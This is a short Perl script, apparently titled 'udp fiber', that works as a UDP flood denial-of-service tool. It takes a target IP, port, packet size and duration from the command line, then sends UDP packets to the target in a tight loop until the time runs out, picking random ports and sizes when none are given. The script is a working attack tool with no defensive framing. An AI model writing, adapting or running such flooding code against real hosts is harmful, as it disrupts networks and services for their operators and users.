#!/usr/bin/perl

##############
# udp fiber.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  system("clear || cls");
#Script Banner================================================================
print q{


             » FB : ทีนะครับ ที
 };
# INPUT TARGET INFO ==============================================
 print " \n";
 print "\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "[ X ] à $ip\n";
$endtime = time() + ($time ? $time : 50);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print  " [IP] $ip
 [PORT]  " . ($port ? $port : "443"). " \n";

print " \n";
print  "\n";
print "\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+2;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}